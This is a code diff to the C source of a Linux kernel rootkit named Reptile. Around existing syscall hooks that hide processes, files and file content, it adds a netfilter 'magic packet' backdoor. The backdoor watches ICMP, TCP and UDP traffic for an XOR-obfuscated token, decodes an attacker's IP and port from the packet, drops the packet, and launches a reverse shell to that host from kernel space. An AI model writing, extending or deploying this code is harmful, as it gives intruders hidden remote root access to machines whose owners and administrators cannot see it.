@@ -18,6 +18,15 @@
 #include <linux/slab.h>
 #include <linux/version.h> 
 #include <linux/file.h>
+#include <linux/workqueue.h>
+#include <linux/init.h>
+#include <linux/netfilter.h>
+#include <linux/netfilter_ipv4.h>
+#include <linux/ip.h>
+#include <linux/icmp.h>
+#include <linux/tcp.h>
+#include <linux/udp.h>
+#include <linux/string.h>
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
 	#include <linux/proc_ns.h>
@@ -28,6 +37,15 @@
 	#include <linux/fdtable.h>
 #endif
 
+#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20)
+    	#define REPTILE_INIT_WORK(_t, _f) INIT_WORK((_t), (void (*)(void *))(_f), (_t))
+#else
+    	#define REPTILE_INIT_WORK(_t, _f) INIT_WORK((_t), (_f))
+#endif
+
+#define bzero(b,len) (memset((b), '\0', (len)), (void) 0)
+#define TOKEN		"F0rb1dd3n"
+#define SHELL		"/reptile/reptile_shell"
 #define START 		"/reptile/reptile_start.sh"
 #define SIGHIDEPROC 	49
 #define SIGHIDEREPTILE 	50
@@ -41,6 +59,8 @@ int hidden = 0, knockon = 0, hide_file_content = 1;
 static struct list_head *mod_list;
 static unsigned long *sct;
 atomic_t read_on;
+struct workqueue_struct *work_queue;
+static struct nf_hook_ops magic_packet_hook_options;
 
 asmlinkage int (*o_setreuid)(uid_t ruid, uid_t euid);
 asmlinkage int (*o_kill)(pid_t pid, int sig);
@@ -53,6 +73,13 @@ asmlinkage int l33t_kill(pid_t pid, int sig);
 asmlinkage int l33t_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
 asmlinkage int l33t_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
 asmlinkage ssize_t l33t_read(int fd, void *buf, size_t nbytes);
+
+struct shell_task {
+    	struct work_struct work;
+    	char *path;
+    	char *ip;
+    	char *port;
+};
 
 struct linux_dirent {
         unsigned long   d_ino;
@@ -81,8 +108,7 @@ void show(void) {
 struct task_struct *find_task(pid_t pid){
 	struct task_struct *p = current;
 	for_each_process(p) {
-		if (p->pid == pid)
-			return p;
+		if (p->pid == pid) return p;
 	}
 	return NULL;
 }
@@ -96,29 +122,51 @@ int is_invisible(pid_t pid){
 	return 0;
 }
 
-static int start_bin_from_userland(char *arg){
-	char *argv[] = { arg, NULL, NULL };
-	static char *env[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
-	return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
+void exec(char **argv){
+	static char *envp[] = { "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
+	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+}
+
+void shell_execer(struct work_struct *work) {
+    	struct shell_task *task = (struct shell_task *)work;
+    	char *argv[] = { task->path, "-t", task->ip, "-p", task->port, NULL };
+
+    	exec(argv);
+    	kfree(task);
+}
+
+int shell_exec_queue(char *path, char *ip, char *port) {
+    	struct shell_task *task;
+
+    	task = kmalloc(sizeof(*task), GFP_KERNEL);
+    
+    	if(!task) return -1;
+
+    	REPTILE_INIT_WORK(&task->work, &shell_execer);
+    	task->path = kstrdup(path, GFP_KERNEL);
+    	task->ip = ip;
+    	task->port = port;
+
+    	return queue_work(work_queue, &task->work);
 }
 
 struct file *e_fget_light(unsigned int fd, int *fput_needed) {
-    struct file *file;
-    struct files_struct *files = current->files;
+    	struct file *file;
+    	struct files_struct *files = current->files;
 
-    *fput_needed = 0;
-    if (likely((atomic_read(&files->count) == 1))) {
-        file = fcheck(fd);
-    } else {
-        spin_lock(&files->file_lock);
-        file = fcheck(fd);
-        if (file) {
-            get_file(file);
-            *fput_needed = 1;
-        }
-        spin_unlock(&files->file_lock);
-    }
-    return file;
+    	*fput_needed = 0;
+    	if (likely((atomic_read(&files->count) == 1))) {
+        	file = fcheck(fd);
+    	} else {
+        	spin_lock(&files->file_lock);
+        	file = fcheck(fd);
+        	if (file) {
+           		get_file(file);
+            		*fput_needed = 1;
+        	}
+        	spin_unlock(&files->file_lock);
+    	}
+    	return file;
 }
 
 int f_check(void *arg, int size) {
@@ -166,13 +214,112 @@ int hide_content(void *arg, int size) {
 	return newret;
 }
 
-void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size) {
-    char *p;
+void s_xor(char *arg, int key, int nbytes) {
+        int i;
+        for(i = 0; i < nbytes; i++) arg[i] ^= key;
+}
 
-    for(p = (char *)haystack; p <= ((char *)haystack - needle_size + haystack_size); p++) {
-        if(memcmp(p, needle, needle_size) == 0) return (void *)p;
-    }
-    return NULL;
+int atoi(char *str){
+	int i, result = 0;
+	for(i = 0; str[i] != '\0'; i++) result = result*10 + str[i] - '\0';
+
+	return result;
+}
+
+void decode_n_spawn(char *data) {
+	int tsize;
+	char *ip, *port = NULL, *buf = NULL;  
+
+    	tsize = strlen(TOKEN);
+	buf = (char *) kmalloc(tsize+24, GFP_KERNEL);
+        bzero(buf, tsize+24);
+        memcpy(buf, data, tsize+24);
+        s_xor(buf, 11, strlen(buf));
+	strsep(&buf, " ");
+	ip = buf;
+	strsep(&buf, " ");
+	port = buf;
+	strsep(&buf, " ");
+
+        if((atoi(port) > 0 && atoi(port) <= 65535) || (strlen(ip) >= 7 && strlen(ip) <= 15)) shell_exec_queue(SHELL, ip, port);
+	if(buf) kfree(buf);
+}
+
+unsigned int magic_packet_hook(const struct nf_hook_ops *ops, struct sk_buff *socket_buffer, 
+			       const struct net_device *in, const struct net_device *out, 
+			       int (*okfn)(struct sk_buff *)) {
+    	struct iphdr   *ip_header;
+    	struct icmphdr *icmp_header;
+    	struct tcphdr  *tcp_header;
+    	struct udphdr  *udp_header;
+    	char *data, token[] = TOKEN;
+    	int tsize;
+
+    	data = NULL;
+    	tsize = strlen(TOKEN);
+    	s_xor(token, 11, tsize);
+
+    	if (!socket_buffer) return NF_ACCEPT;
+
+    	ip_header = ip_hdr(socket_buffer);
+
+    	if (!ip_header) return NF_ACCEPT;
+    	if (!ip_header->protocol) return NF_ACCEPT;
+
+     	if (ip_header->protocol == IPPROTO_ICMP) {
+        	icmp_header = (struct icmphdr *)((__u32 *)ip_header + ip_header->ihl);
+
+        	if (!icmp_header) return NF_ACCEPT;
+
+        	data = (char *)((unsigned char *)icmp_header + sizeof(struct icmphdr));
+
+    		if (!data) return NF_ACCEPT;
+
+    		if ((icmp_header->code == ICMP_ECHO) && (memcmp(data, token, tsize) == 0)){
+    			decode_n_spawn(data);
+			return NF_DROP;
+    		}
+    	}
+     
+     	if (ip_header->protocol == IPPROTO_TCP) {
+        	tcp_header = (struct tcphdr *)((__u32 *)ip_header + ip_header->ihl);
+
+        	if (!tcp_header) return NF_ACCEPT;
+
+        	data = (char *)((unsigned char *)tcp_header + sizeof(struct tcphdr));
+    		
+		if (!data) return NF_ACCEPT;
+
+		if(htons(tcp_header->source) == 666 && htons(tcp_header->dest) == 80 && memcmp(data, token, tsize) == 0){
+			decode_n_spawn(data);
+			return NF_DROP;
+		}
+    	}
+     
+     	if (ip_header->protocol == IPPROTO_UDP) {
+        	udp_header = (struct udphdr *)((__u32 *)ip_header + ip_header->ihl);
+
+        	if (!udp_header) return NF_ACCEPT;
+
+        	data = (char *)((unsigned char *)udp_header + sizeof(struct udphdr));
+    		
+		if (!data) return NF_ACCEPT;
+
+		if(htons(udp_header->source) == 666 && htons(udp_header->dest) == 53 && memcmp(data, token, tsize) == 0){
+			decode_n_spawn(data);
+			return NF_DROP;
+		}
+    	}
+    	return NF_ACCEPT;
+}
+
+void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size) {
+    	char *p;
+
+    	for(p = (char *)haystack; p <= ((char *)haystack - needle_size + haystack_size); p++) {
+        	if(memcmp(p, needle, needle_size) == 0) return (void *)p;
+    	}
+    	return NULL;
 }
 
 #if defined(x86_64) || defined(amd64)
@@ -406,6 +553,8 @@ asmlinkage ssize_t l33t_read(int fd, void *buf, size_t nbytes) {
 }
 
 static int __init reptile_init(void) { 
+	char *argv[] = { START, NULL, NULL };
+	
 	atomic_set(&read_on, 0);
 	sct = (unsigned long *)find_sys_call_table();
 
@@ -429,7 +578,18 @@ static int __init reptile_init(void) {
 	sct[__NR_read] = (unsigned long)l33t_read;		
 	write_cr0(read_cr0() | 0x10000);
 
-	start_bin_from_userland(START);
+    	magic_packet_hook_options.hook     = (void *) magic_packet_hook;
+    	magic_packet_hook_options.hooknum  = 0;
+    	magic_packet_hook_options.pf       = PF_INET;
+    	magic_packet_hook_options.priority = NF_IP_PRI_FIRST;
+
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
+    	nf_register_net_hook(&init_net, &magic_packet_hook_options);
+#else
+    	nf_register_hook(&magic_packet_hook_options);
+#endif
+    	work_queue = create_workqueue("reptile_shell");	
+	exec(argv);
 
 	return 0; 
 } 
@@ -465,6 +625,14 @@ static void __exit reptile_exit(void) {
 		sct[__NR_read] = (unsigned long)o_read;
 		write_cr0(read_cr0() | 0x10000);
 	}
+
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
+	nf_unregister_net_hook(&init_net, &magic_packet_hook_options);
+#else
+    	nf_unregister_hook(&magic_packet_hook_options);
+#endif
+    	flush_workqueue(work_queue);
+    	destroy_workqueue(work_queue);
 }
 
 module_init(reptile_init);
